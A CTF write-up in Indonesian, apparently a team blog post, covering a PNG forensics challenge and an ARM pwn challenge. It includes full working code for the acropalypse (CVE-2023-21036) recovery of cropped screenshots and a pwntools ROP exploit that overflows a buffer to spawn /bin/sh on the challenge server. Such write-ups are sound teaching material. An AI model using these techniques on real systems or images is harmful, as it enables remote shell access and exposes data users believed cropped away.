+++
title = "Cyber Jawara 2023 Quals"
date = 2023-11-21
draft = false
categories = ["CTF Writeups"]
tags = ["cyber-jawara", "forensics", "pwn", "writeup"]
summary = "Writeup tim CP Enjoyer untuk challenge Forensics (apocalypse) dan Pwn (sorearm) di CTF Cyber Jawara 2023 babak kualifikasi."
+++

Writeup dari tim **CP Enjoyer** untuk CTF Cyber Jawara 2023 babak kualifikasi — hanya bagian **Forensics** dan **Pwn**.

---

# Forensik

## apocalypse (610 pts)

{{< admonition quote "Deskripsi" >}}
I pulled these two screenshot images from my old device. It was not until I noticed that both of them have a flaw — damaged chunks.

**Flag format:** `CJ2023{[a-f0-9]{20}}`

**Attachments:** `Screenshot_20231121-233803.png` dan `Screenshot_20231121-234138.png`

**Hint:** The images were originally captured and cropped using the built-in app of a certain Android stock phone before it became damaged. Furthermore, the result may be related to a security issue.
{{< /admonition >}}

### Analisis awal

Diberikan dua PNG yang tidak bisa dibuka. Setelah membukanya pada bless hex editor, terlihat `size` dan `crc` dari semua chunk telah diubah menjadi `00`. Maka, kami membuat script sederhana untuk recover size dan crc dari semua chunk, dan mendapatkan gambar `fixed1.png` dan `fixed2.png`.

{{< image src="apocalypse-hex.png" caption="Struktur chunk PNG yang size dan CRC-nya dihapus menjadi 00 (bless hex editor)" >}}

**solver.py**:

```python
#!/usr/bin/env python3
import struct
import zlib
import re

chunk_type = [b'IHDR', b'tEXt', b'zTXt', b'iTXt', b'tRNS', b'cHRM',
              b'gAMA', b'iCCP', b'sRGB', b'bKGD', b'pHYs', b'hIST', b'sPLT',
              b'sBIT', b'fcTL', b'acTL', b'fdAT', b'tIME', b'vpAG', b'PLTE',
              b'oFFs', b'pCAL', b'sCAL', b'sTER', b'fRAc', b'eXIf', b'IDAT',
              b'IEND']

def crc32(data):
    return struct.pack(
        '>I', zlib.crc32(data) % (1 << 32)
    )

def lookup_chunk(data):
    pattern = b'|'.join(chunk_type)
    regex = re.compile(pattern)
    return regex.finditer(data)

#content = open('Screenshot_20231121-233803.png', 'rb').read()
content = open('Screenshot_20231121-234138.png', 'rb').read()
known_chunks = list(lookup_chunk(content))
splitted_chunks = []

for i, chunk in enumerate(known_chunks):
    start, end = chunk.start(), chunk.end()
    if content[start:end] == b'IEND' and i == len(known_chunks) - 1:
        splitted_chunks.append(bytes.fromhex('00 00 00 00 49 45 4E 44 AE 42 60 82'))
        break
    start1, end1 = known_chunks[i + 1].start(), known_chunks[i + 1].end()
    #print(type(chunk), dir(chunk))
    #print(len(content[end:start1])-8, content[end:start1])
    size = len(content[end:start1]) - 8
    chunk_size = struct.pack('!I', size)
    chunk_type = chunk.group()
    if content[start:end] == b'IEND':
        splitted_chunks.append(b'\0' * 4 + chunk_type + content[start + 4:start + 4 + size + 4])
        continue
    chunk_data = content[start + 4:start + 4 + size]
    chunk_crc = crc32(chunk_type + chunk_data)
    print(chunk_type)
    splitted_chunks.append(
        chunk_size +
        chunk_type +
        chunk_data +
        chunk_crc
    )

#with open('fixed1.png', 'wb') as f:
with open('fixed2.png', 'wb') as f:
    f.write(b'\x89PNG\r\n\x1a\n')
    f.write(b''.join(splitted_chunks))
```

{{< image-row height=320 >}}
{{< image src="apocalypse-fixed1.png" caption="fixed1.png" >}}
{{< image src="apocalypse-fixed2.png" caption="fixed2.png" >}}
{{< /image-row >}}

Didapatkan flag bagian pertama. Namun, masih terdapat sesuatu yang aneh pada kedua PNG. Terdapat dua chunk `IEND` pada keduanya. Saya awalnya mengira chunk `IEND` yang pertama seharusnya tidak diperlukan. Maka, saya menghapusnya, namun gambarnya tetap sama dan justru chunk-chunk `IDAT`-nya memiliki ukuran yang aneh-aneh. Saya kemudian menganggap chunk-chunk setelah chunk `IEND` pertama sebagai PNG yang berbeda. Saya memisahkannya dan menambahkan signature PNG dan chunk `IHDR` pada awalnya tapi tidak menghasilkan gambar apa-apa. Saya juga masih kebingungan mengenai 1 chunk pas setelah chunk `IEND` pertama yang tidak memiliki chunk `header` namun `crc`-nya tetap utuh.

### Memahami maksud soal

Setelah membaca ulang deskripsi dan hint, saya mencari-cari CVE dan menemukan <https://www.da.vidbuchanan.co.uk/blog/exploiting-acropalypse.html>. Terdapat `CVE-2023-21036` yang memungkinkan seseorang untuk mendapatkan bagian dari gambar asli suatu gambar yang telah di-edit. Ini disebabkan oleh data gambar asli yang tidak dihapus setelah diedit, sehingga apabila data gambar setelah di-edit lebih pendek dibandingkan sebelum di-edit, akan tersisa chunk-chunk PNG asli. Ini menjelaskan kenapa terdapat dua chunk `IEND`, serta mengapa chunk yang ditemukan setelah chunk `IEND` pertama tidak memiliki `header` namun `crc`-nya tetap utuh. Maka, alur menyelesaikan chall ini sudah jelas. Kita harus recover `size` dan `crc` semua chunk pada kedua PNG dan tidak menghapus chunk apapun (sudah dilakukan). Kemudian, dengan menggunakan POC pada link di atas, bisa didapatkan bagian dari PNG asli sebelum di-edit. Menggunakan script tersebut juga, akan ketahuan apabila terdapat kesalahan pada proses recovery `size` dan `crc` yang sebelumnya dilakukan.

### Eksekusi mendapatkan flag

**acropalypse_matching_sha256.py**:

```python
import zlib
import sys
import io

if len(sys.argv) != 5:
    print(f"USAGE: {sys.argv[0]} orig_width orig_height cropped.png reconstructed.png")
    exit()

PNG_MAGIC = b"\x89PNG\r\n\x1a\n"

def parse_png_chunk(stream):
    size = int.from_bytes(stream.read(4), "big")
    ctype = stream.read(4)
    body = stream.read(size)
    csum = int.from_bytes(stream.read(4), "big")
    assert(zlib.crc32(ctype + body) == csum)
    return ctype, body

def pack_png_chunk(stream, name, body):
    stream.write(len(body).to_bytes(4, "big"))
    stream.write(name)
    stream.write(body)
    crc = zlib.crc32(body, zlib.crc32(name))
    stream.write(crc.to_bytes(4, "big"))

orig_width = int(sys.argv[1])
orig_height = int(sys.argv[2])
f_in = open(sys.argv[3], "rb")
magic = f_in.read(len(PNG_MAGIC))
assert(magic == PNG_MAGIC)

# find end of cropped PNG
while True:
    ctype, body = parse_png_chunk(f_in)
    if ctype == b"IEND":
        break

# grab the trailing data
trailer = f_in.read()
print(f"Found {len(trailer)} trailing bytes!")

# find the start of the nex idat chunk
try:
    next_idat = trailer.index(b"IDAT", 12)
except ValueError:
    print("No trailing IDATs found :(")
    exit()

# skip first 12 bytes in case they were part of a chunk boundary
idat = trailer[12:next_idat-8] # last 8 bytes are crc32, next chunk

stream = io.BytesIO(trailer[next_idat-4:])
while True:
    ctype, body = parse_png_chunk(stream)
    if ctype == b"IDAT":
        idat += body
    elif ctype == b"IEND":
        break
    else:
        raise Exception("Unexpected chunk type: " + repr(ctype))

idat = idat[:-4] # slice off the adler32
print(f"Extracted {len(idat)} bytes of idat!")
print("building bitstream...")

bitstream = []
for byte in idat:
    for bit in range(8):
        bitstream.append((byte >> bit) & 1)

# add some padding so we don't lose any bits
for _ in range(7):
    bitstream.append(0)

print("reconstructing bit-shifted bytestreams...")
byte_offsets = []
for i in range(8):
    shifted_bytestream = []
    for j in range(i, len(bitstream) - 7, 8):
        val = 0
        for k in range(8):
            val |= bitstream[j + k] << k
        shifted_bytestream.append(val)
    byte_offsets.append(bytes(shifted_bytestream))

# bit wrangling sanity checks
assert(byte_offsets[0] == idat)
assert(byte_offsets[1] != idat)

print("Scanning for viable parses...")
# prefix the stream with 32k of "X" so backrefs can work
prefix = b"\x00" + (0x8000).to_bytes(2, "little") + (0x8000 ^ 0xffff).to_bytes(2, "little") + b"X" * 0x8000

for i in range(len(idat)):
    truncated = byte_offsets[i % 8][i // 8:]
    # only bother looking if it's (maybe) the start of a non-final adaptive huffman coded block
    if truncated[0] & 7 != 0b100:
        continue
    d = zlib.decompressobj(wbits=-15)
    try:
        decompressed = d.decompress(prefix + truncated) + d.flush(zlib.Z_FINISH)
        decompressed = decompressed[0x8000:] # remove leading padding
        if d.eof and d.unused_data in [b"", b"\x00"]: # there might be a null byte if we added too many padding bits
            print(f"Found viable parse at bit offset {i}!")
            # XXX: maybe there could be false positives and we should keep looking?
            break
        else:
            print(f"Parsed until the end of a zlib stream, but there was still {len(d.unused_data)} byte of remaining data. Skipping.")
    except zlib.error as e: # this will happen almost every time
        #print(e)
        pass
else:
    print("Failed to find viable parse :(")
    exit()

print("Generating output PNG...")
out = open(sys.argv[4], "wb")
out.write(PNG_MAGIC)

ihdr = b""
ihdr += orig_width.to_bytes(4, "big")
ihdr += orig_height.to_bytes(4, "big")
ihdr += (8).to_bytes(1, "big") # bitdepth
ihdr += (2).to_bytes(1, "big") # true colour
ihdr += (0).to_bytes(1, "big") # compression method
ihdr += (0).to_bytes(1, "big") # filter method
ihdr += (0).to_bytes(1, "big") # interlace method
pack_png_chunk(out, b"IHDR", ihdr)

# fill missing data with solid magenta
reconstructed_idat = bytearray((b"\x00" + b"\xff\x00\xff" * orig_width) * orig_height)
# paste in the data we decompressed
reconstructed_idat[-len(decompressed):] = decompressed

# one last thing: any bytes defining filter mode may
# have been replaced with a backref to our "X" padding
# we should fine those and replace them with a valid filter mode (0)
print("Fixing filters...")
for i in range(0, len(reconstructed_idat), orig_width * 3 + 1):
    if reconstructed_idat[i] == ord("X"):
        #print(f"Fixup'd filter byte at idat byte offset {i}")
        reconstructed_idat[i] = 0

pack_png_chunk(out, b"IDAT", zlib.compress(reconstructed_idat))
pack_png_chunk(out, b"IEND", b"")
print("Done!")
```

{{< image src="apocalypse-result1.png" caption="Output acropalypse_matching_sha256.py" >}}

{{< admonition note "Catatan" >}}
Tinggi gambar awal kami dapatkan dari perkiraan device Android yang digunakan, dari referensi <https://acropalypse.app/>.
{{< /admonition >}}

{{< image-row height=600 >}}
{{< image src="apocalypse-result2.png" caption="Hasil rekonstruksi gambar asli (asli1.png)" >}}
{{< image src="apocalypse-result3.png" caption="Hasil rekonstruksi gambar asli (asli2.png)" >}}
{{< /image-row >}}

> Flag: `CJ2023{cb2aa1108f6aebb88c30}`

---

# Pwn

## sorearm (550 pts)

{{< admonition quote "Deskripsi" >}}
can't pwn with my sore arm

`nc 137.184.6.25 17002`

**Attachments:** `chall`
{{< /admonition >}}

### Analisis awal

Diberikan suatu binary chall yang merupakan binary ARM 32-bit LSB, dan tidak stripped. Mitigasi yang hidup hanyalah NX dan Partial-RELRO. Terdapat fungsi `a` yang memanggil `puts(binsh)` dan fungsi `b` yang memanggil `system(command)`. Variabel `binsh` berisi string `"/bin/sh"` dan `command` berisi string `"id"` dan keduanya merupakan variabel global. Terdapat juga vulnerability buffer overflow pada fungsi `main`.

{{< image src="sorearm-checksec.png" caption="file & checksec chall" >}}
{{< image src="sorearm-disasm.png" caption="Hasil decompile fungsi a, b, dan main" >}}

### Mencari jalan menuju shell

Setelah mencari gadget dan melihat instruksi-instruksi pada fungsi `b`, terlihat jelas alur exploit yang memungkinkan. Menggunakan buffer overflow pada fungsi `main`, dapat dilakukan rop untuk mengisi `r3` dengan alamat string `"/bin/sh"` pada bss, dan kemudian lompat ke `b+10` untuk memindahkan alamat tersebut dari `r3` ke `r0` sehingga akan menjadi argumen pada fungsi `system`.

{{< image src="sorearm-gadget1.png" caption="Gadget pop {r3, pc}" >}}
{{< image src="sorearm-gadget2.png" caption="Disassembly fungsi b (lompat ke b+10 untuk mov r0, r3)" >}}

### Eksekusi mendapatkan shell

**solve.py**:

```python
#!/usr/bin/env python3
from pwn import *
import sys
import os
import random

exe = ELF("./chall_patched")
context.binary = exe
context.log_level = 'debug'

cmd = '''
set max-visualize-chunk-size 0x500
b *main
c
'''

def conn(cmd):
    global r
    global payload
    if 'i' in sys.argv:
        context.log_level = 'info'
    elif 'c' in sys.argv:
        context.log_level = 'critical'
    if '1' in sys.argv or 'local' in sys.argv:
        r = process([exe.path])
    elif '2' in sys.argv or 'server' in sys.argv:
        r = remote('137.184.6.25', 17002)
    else:
        if context.arch == 'i386' or context.arch == 'amd64':
            r = process([exe.path], aslr=False)
        else:
            port = str(random.randint(1000, 9999))
            cmd = 'file %s\ntarget remote localhost:%s' % (exe.path, port) + cmd
            if context.arch == 'arm' and context.endian == 'little':
                r = process(['qemu-arm-static', '-g', port, exe.path])
            elif context.arch == 'mips' and context.endian == 'little':
                r = process(['qemu-mipsel-static', '-g', port, exe.path])
        sleep(1)
        gdb.attach(r, cmd)

def main():
    global r
    global payload
    conn(cmd)
    rop = ROP(exe)
    payload = flat({28: 0x10527}, next(exe.search(b'/bin/sh\0')), 0, 0, exe.sym.b + 10)
    r.send(payload)
    context.log_level = 'debug'
    r.interactive()

if __name__ == "__main__":
    main()
```

{{< image src="sorearm-result.png" caption="Exploit berhasil, flag didapat" >}}

{{< admonition note "Catatan" >}}
Ingat untuk men-download qemu-user untuk menjalankan binary tersebut apabila menggunakan arsitektur yang berbeda dari ARM, dan juga gdb-multiarch untuk debugging-nya.
{{< /admonition >}}

> Flag: `CJ2023{6fb2ad4fe1019c980a3d67b6754733ec}`
